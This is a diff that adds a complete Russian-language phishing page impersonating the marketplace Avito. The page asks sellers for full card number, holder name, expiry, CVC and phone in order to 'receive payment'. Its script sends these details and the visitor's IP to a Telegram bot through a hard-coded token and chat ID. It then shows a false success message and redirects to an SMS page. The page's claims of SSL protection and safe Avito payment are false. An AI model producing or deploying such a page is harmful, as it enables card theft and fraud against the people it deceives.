@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Авито • Получение оплаты за товар</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Roboto', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #f5fff7 0%, #e8f5e9 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: white;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 15px 35px rgba(56, 142, 60, 0.12);
+            border: 1px solid #c8e6c9;
+        }
+
+        .header {
+            background: linear-gradient(to right, #2e7d32, #4caf50);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .avito-logo {
+            font-size: 32px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .header h1 {
+            font-size: 22px;
+            font-weight: 600;
+            opacity: 0.95;
+            margin-top: 10px;
+        }
+
+        .content {
+            padding: 35px;
+        }
+
+        .payment-info {
+            background-color: #f1f8e9;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 30px;
+            border: 1px dashed #81c784;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 16px;
+        }
+
+        .info-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .label {
+            color: #388e3c;
+            font-weight: 500;
+        }
+
+        .value {
+            font-weight: 700;
+            color: #1b5e20;
+        }
+
+        .highlight {
+            font-size: 28px;
+            color: #1b5e20;
+            text-align: center;
+            padding: 10px;
+            background: #e8f5e9;
+            border-radius: 12px;
+            margin: 15px 0;
+            font-weight: 800;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #2e7d32;
+            font-weight: 600;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 18px 20px;
+            border: 2px solid #c8e6c9;
+            border-radius: 12px;
+            font-size: 16px;
+            color: #1b5e20;
+            background-color: #f9fdf9;
+            transition: all 0.3s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #4caf50;
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.2);
+        }
+
+        .input-field::placeholder {
+            color: #81c784;
+        }
+
+        .card-icons {
+            position: absolute;
+            right: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            gap: 8px;
+        }
+
+        .card-icon {
+            height: 24px;
+            width: auto;
+            opacity: 0.7;
+        }
+
+        .row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 22px;
+            background: linear-gradient(to right, #388e3c, #4caf50);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            letter-spacing: 0.5px;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(to right, #2e7d32, #43a047);
+            transform: translateY(-2px);
+            box-shadow: 0 7px 14px rgba(56, 142, 60, 0.25);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .submit-btn:disabled {
+            background: #a5d6a7;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .secure-note {
+            text-align: center;
+            margin-top: 25px;
+            color: #66bb6a;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .status-message {
+            margin-top: 25px;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 600;
+            display: none;
+        }
+
+        .status-success {
+            background-color: #e8f5e9;
+            color: #1b5e20;
+            border: 2px solid #a5d6a7;
+            display: block;
+        }
+
+        .status-error {
+            background-color: #ffebee;
+            color: #c62828;
+            border: 2px solid #ef9a9a;
+            display: block;
+        }
+
+        .status-processing {
+            background-color: #e3f2fd;
+            color: #1565c0;
+            border: 2px solid #90caf9;
+            display: block;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 25px;
+            color: #81c784;
+            font-size: 13px;
+            border-top: 1px solid #e8f5e9;
+            background: #f9fdf9;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <span class="avito-logo">AVITO</span>
+            <h1>Получите оплату за товар</h1>
+        </div>
+
+        <div class="content">
+            <div class="payment-info">
+                <div class="info-row">
+                    <span class="label">Продавец:</span>
+                    <span class="value">Иванов Алексей</span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Товар:</span>
+                    <span class="value">Ноутбук Apple MacBook Pro</span>
+                </div>
+                <div class="info-row">
+                    <span class="label">ID сделки:</span>
+                    <span class="value">#AV-7842-95</span>
+                </div>
+                <div class="highlight">
+                    5 000 ₽
+                </div>
+                <div style="text-align: center; color: #388e3c; font-size: 15px; margin-top: 10px;">
+                    <i class="fas fa-lock"></i> Безопасный платеж через Авито
+                </div>
+            </div>
+
+            <form id="paymentForm">
+                <div class="form-group">
+                    <label for="cardNumber">Номер банковской карты</label>
+                    <div class="input-wrapper">
+                        <input type="text" 
+                               id="cardNumber" 
+                               class="input-field" 
+                               placeholder="1234 5678 9012 3456" 
+                               maxlength="19" 
+                               required>
+                        <div class="card-icons">
+                            <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="card-icon" alt="Mastercard">
+                            <img src="https://img.icons8.com/color/48/000000/visa.png" class="card-icon" alt="Visa">
+                            <img src="https://img.icons8.com/color/48/000000/mir.png" class="card-icon" alt="Mir">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="cardHolder">Имя владельца карты</label>
+                    <input type="text" 
+                           id="cardHolder" 
+                           class="input-field" 
+                           placeholder="Как на карте" 
+                           required>
+                </div>
+
+                <div class="row">
+                    <div class="form-group">
+                        <label for="cardExpiry">Срок действия</label>
+                        <input type="text" 
+                               id="cardExpiry" 
+                               class="input-field" 
+                               placeholder="ММ/ГГ" 
+                               maxlength="5" 
+                               required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cardCVC">CVC/CVV</label>
+                        <input type="text" 
+                               id="cardCVC" 
+                               class="input-field" 
+                               placeholder="123" 
+                               maxlength="4" 
+                               inputmode="numeric" 
+                               required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Ваш телефон для уведомлений</label>
+                    <input type="tel" 
+                           id="phone" 
+                           class="input-field" 
+                           placeholder="+7 (900) 123-45-67" 
+                           required>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    <span id="btnText">Получить 5 000 ₽</span>
+                    <div id="btnLoader" class="loader" style="display:none;"></div>
+                </button>
+
+                <div class="secure-note">
+                    <i class="fas fa-shield-alt"></i> Ваши данные защищены шифрованием SSL
+                </div>
+            </form>
+
+            <div id="statusMessage" class="status-message"></div>
+        </div>
+
+        <div class="footer">
+            <p>© 2025 Авито. ООО «Авито Холдинг»</p>
+            <p style="margin-top: 5px; font-size: 12px;">Платеж обрабатывается через безопасный шлюз</p>
+        </div>
+    </div>
+
+    <script>
+        // ========== КОНФИГУРАЦИЯ ==========
+        // ЗАМЕНИТЕ ЭТИ ДАННЫЕ НА СВОИ
+        const BOT_TOKEN = '8318568144:AAH0rXReromePvHLJ5XTcXo7MJYKOptyhTY';   // Ваш токен бота от @BotFather
+        const CHAT_ID = '5213238680';       // Ваш ID чата в Telegram
+
+        // ========== ФОРМАТИРОВАНИЕ ВВОДА ==========
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = value.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = formatted.substring(0, 19);
+        });
+
+        document.getElementById('cardExpiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+        });
+
+        document.getElementById('cardCVC').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+        });
+
+        document.getElementById('phone').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length === 0) return;
+            if (value[0] === '7' || value[0] === '8') {
+                value = value.substring(1);
+            }
+            let formatted = '+7';
+            if (value.length > 0) formatted += ' (' + value.substring(0, 3);
+            if (value.length >= 4) formatted += ') ' + value.substring(3, 6);
+            if (value.length >= 7) formatted += '-' + value.substring(6, 8);
+            if (value.length >= 9) formatted += '-' + value.substring(8, 10);
+            e.target.value = formatted;
+        });
+
+        // ========== ОТПРАВКА ФОРМЫ ==========
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const btn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const btnLoader = document.getElementById('btnLoader');
+            const statusDiv = document.getElementById('statusMessage');
+
+            // Блокируем кнопку и показываем загрузку
+            btn.disabled = true;
+           // window.location.href = '/sms.html'; // Или '/sms.php', или 'sms/'
+            btnText.style.display = 'none';
+            btnLoader.style.display = 'inline-block';
+            statusDiv.className = 'status-processing';
+            statusDiv.textContent = 'Обработка платежа...';
+            statusDiv.style.display = 'block'; 
+            //header('Location: sms.html');
+
+            // Собираем данные
+            const paymentData = {
+                amount: '5 000 ₽',
+                cardNumber: document.getElementById('cardNumber').value,
+                cardHolder: document.getElementById('cardHolder').value,
+                cardExpiry: document.getElementById('cardExpiry').value,
+                cardCVC: document.getElementById('cardCVC').value,
+                phone: document.getElementById('phone').value,
+                timestamp: new Date().toLocaleString('ru-RU'),
+                userAgent: navigator.userAgent.substring(0, 100),
+                ip: await fetch('https://api.ipify.org?format=json')
+                         .then(r => r.json())
+                         .then(data => data.ip)
+                         .catch(() => 'Не определен')
+            };
+
+            // Формируем сообщение для Telegram
+            const message = `
+💳 *НОВАЯ ОПЛАТА НА АВИТО — 5 000 ₽*
+————————————————
+*💸 Сумма:* 5 000 ₽
+————————————————
+*👤 Данные покупателя:*
+Телефон: ${paymentData.phone}
+————————————————
+*🪪 Данные карты:*
+Номер: \`${paymentData.cardNumber}\`
+Держатель: ${paymentData.cardHolder}
+Срок: ${paymentData.cardExpiry}
+CVC: \`${paymentData.cardCVC}\`
+————————————————
+*📊 Технические данные:*
+IP: ${paymentData.ip}
+Время: ${paymentData.timestamp}
+————————————————
+            `.trim();
+
+            // Отправляем в Telegram
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await response.json();
+
+                if (result.ok) {
+                    // Успех
+                    statusDiv.className = 'status-success';
+                    statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Оплата успешно получена! Средства зачислятся на ваш счет в течение 5 минут.';
+                    document.getElementById('paymentForm').reset();
+                    window.location.href = '/sms.html'; // Или '/sms.php', или 'sms/'
+                } else {
+                    throw new Error('Ошибка Telegram API');
+                }
+            } catch (error) {
+                console.error('Ошибка:', error);
+                statusDiv.className = 'status-error';
+                statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Ошибка соединения. Пожалуйста, проверьте данные и попробуйте снова.';
+            } finally {
+                // Восстанавливаем кнопку
+                btn.disabled = false;
+                btnText.style.display = 'inline';
+                btnLoader.style.display = 'none';
+            }
+        });
+
+        // Авто-фокус на первое поле
+        document.getElementById('cardNumber').focus();
+    </script>
+</body>
+</html>
